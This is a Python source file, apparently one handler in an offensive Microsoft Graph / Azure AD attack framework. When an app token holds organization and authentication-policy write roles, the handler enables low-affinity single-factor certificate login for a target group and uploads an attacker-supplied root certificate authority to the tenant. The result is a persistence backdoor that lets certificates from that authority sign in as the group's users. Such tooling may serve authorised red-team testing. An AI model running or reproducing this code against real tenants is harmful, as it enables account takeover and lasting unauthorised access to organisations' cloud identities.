from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
import base64

logger = logger.createLogger('attacks.handlers.org_auth_meth_handler')


class OrgAuthMeth_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        if ("Organization.ReadWrite.All" in request.roles) and ("Policy.ReadWrite.AuthenticationMethod" in request.roles):
            status = False
            attack_name = "org_auth_methVectors"
            message = ""
            error = "org_auth_methVectors - failed"
            conf = request.attack_config['OrgAuthMeth']
            logger.debug("Organization.RW.All - Allows the app to read and write the organization and related resources, on behalf of the signed-in user.")
            logger.debug("Policy.ReadWrite.AuthenticationMethod - Allows the app to read and write all authentication method policies for the tenant, without a signed-in user.")
            logger.debug("Attack vector - persistance.")
            try:
                create_message_URL = "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
                message_obj = {"@odata.type":"#microsoft.graph.x509CertificateAuthenticationMethodConfiguration","id":"X509Certificate","certificateUserBindings":[{"x509CertificateField":"PrincipalName","userProperty":"userPrincipalName","priority":1,"trustAffinityLevel":"low"},{"x509CertificateField":"RFC822Name","userProperty":"userPrincipalName","priority":2,"trustAffinityLevel":"low"},{"x509CertificateField":"SubjectKeyIdentifier","userProperty":"certificateUserIds","priority":3,"trustAffinityLevel":"high"}],"authenticationModeConfiguration":{"x509CertificateAuthenticationDefaultMode":"x509CertificateSingleFactor","x509CertificateDefaultRequiredAffinityLevel":"low","rules":[]},"includeTargets":[{"id":conf["groupId"],"isRegistrationRequired":"false","targetType":"group"}],"excludeTargets":[],"state":"enabled"}
                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 204:
                    with open(conf["cert_file"], 'rb') as cert_file:
                        cert_bytes = cert_file.read()
                        cert_base64 = base64.b64encode(cert_bytes)

                    cert = cert_base64.decode('utf-8')
                    create_message_URL = "https://graph.microsoft.com/v1.0/organization/" + request.tenantId + "/certificateBasedAuthConfiguration"
                    message_obj = {"certificateAuthorities":[{"isRootAuthority":"true","certificateRevocationListUrl":"","deltaCertificateRevocationListUrl":"","certificate":cert}]}

                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    if result.status_code == 201:
                        message += "added the group to cert authentication.\n"
                        status = True
                        
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in org_auth_meth_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
